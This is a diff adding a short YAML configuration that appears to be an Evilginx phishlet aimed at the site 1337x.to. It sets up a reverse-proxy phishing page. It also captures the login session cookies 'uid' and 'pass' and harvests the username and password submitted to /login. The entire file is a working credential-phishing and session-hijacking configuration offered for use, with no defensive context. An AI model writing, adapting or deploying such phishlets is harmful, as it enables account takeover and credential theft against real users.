@@ -1,0 +1,21 @@
+
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: '1337x.to', session: true, is_landing: true, auto_filter: true}
+auth_tokens:
+  - domain: '1337x.to'
+    keys: ['uid','pass']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: '1337x.to'
+  path: '/login'
